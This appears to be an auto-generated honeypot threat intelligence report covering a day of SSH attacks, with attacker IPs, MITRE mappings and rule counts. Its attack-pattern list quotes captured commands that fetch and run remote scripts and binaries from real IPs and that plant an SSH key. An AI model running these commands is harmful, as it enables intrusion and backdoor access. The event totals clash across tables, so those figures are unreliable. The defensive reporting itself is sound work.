# Threat Intelligence Report

**Generated**: 2026-04-20 09:49 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **290 events** from **547 unique source IPs** across **32 countries** and **48 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 290 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 547 |
| Atomic Attack Patterns | 301 |
| MITRE ATT&CK Techniques | 5 |
| Generated Sigma Rules | 3 |
| Generated YARA Rules | 2 |
| Generated Suricata Rules | 2 |
| Blocked IPs (Firewall) | 505 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1082 (System Information Discovery) | | 288 |
| T1105 (Ingress Tool Transfer) | | 4 |
| T1059.004 (Unix Shell) | | 2 |
| T1552.004 (Private Keys) | | 1 |
| T1005 (Data from Local System) | | 1 |

### Tactics Distribution

- **discovery**: 288 events ████████████████████████████████████████
- **command_and_control**: 4 events ██
- **execution**: 2 events █
- **credential_access**: 1 events 
- **collection**: 1 events 

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 27,154 |
| France | 7,734 |
| Mexico | 6,265 |
| Germany | 2,001 |
| Bulgaria | 1,180 |
| Netherlands | 951 |
| United Kingdom | 642 |
| China | 500 |
| Singapore | 370 |
| Pakistan | 361 |
| Hong Kong | 341 |
| South Korea | 252 |
| Portugal | 217 |
| Belgium | 216 |
| Japan | 160 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| ReliableSite.Net LLC | 23,197 |
| Sierra Madre Internet SA de CV | 6,039 |
| Modat B.V. | 4,050 |
| OVH SAS | 3,492 |
| ColocaTel Inc. | 1,126 |
| Tube-Hosting | 1,046 |
| Hydra Communications Ltd | 1,022 |
| Google LLC | 1,005 |
| Amazon.com, Inc. | 784 |
| Alibaba US Technology Co., Ltd. | 682 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 639 |
| Censys, Inc. | 627 |
| Vpsvault.host Ltd | 412 |
| ONYPHE SAS | 350 |
| DigitalOcean, LLC | 345 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `177.125.137.18` | 6,039 | Attacker |
| `104.243.43.7` | 4,511 | Attacker |
| `104.243.32.235` | 4,493 | Attacker |
| `104.243.35.94` | 3,602 | Attacker |
| `51.68.207.118` | 3,488 | Attacker |
| `104.243.35.92` | 2,248 | Attacker |
| `206.221.176.60` | 1,814 | Attacker |
| `185.150.191.165` | 1,802 | Attacker |
| `85.11.167.11` | 1,111 | Attacker |
| `185.91.127.85` | 1,044 | Attacker |
| `104.243.34.165` | 946 | Attacker |
| `104.243.35.120` | 937 | Attacker |
| `104.243.32.126` | 928 | Attacker |
| `104.243.35.104` | 904 | Attacker |
| `104.243.43.19` | 889 | Attacker |
| `85.217.140.16` | 683 | Attacker |
| `85.217.140.11` | 285 | Attacker |
| `85.217.140.37` | 273 | Attacker |
| `85.217.140.41` | 258 | Attacker |
| `85.217.140.33` | 255 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 547 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 0 |

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [222x] `uname -a`
- [66x] `/bin/./uname -s -v -n -r -m`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [1x] `curl -sk https://46.151.182.82/sh`
- [1x] `sh -s ssh`
- [1x] `cd /usr`
- [1x] `curl -O 61.184.10.103/gg`
- [1x] `chmod 0755 gg`
- [1x] `rm -rf gg`
- [1x] `curl -O 61.184.10.103/syss`
- [1x] `chmod 0755 syss`
- [1x] `./syss`
- [1x] `echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAmFBsJB43Hg7IM/dnZVUYAOI68/xIJvO2sebbI2hQq9jcbloVpF3rY6oqny`
- [1x] `netstat -tulpn`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 3 | `sigma/*.yml` |
| YARA (Payload) | 2 | `yara/*.yar` |
| Suricata (IDS/IPS) | 2 | `suricata/honeypot.rules` |
| Firewall (iptables) | 505 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*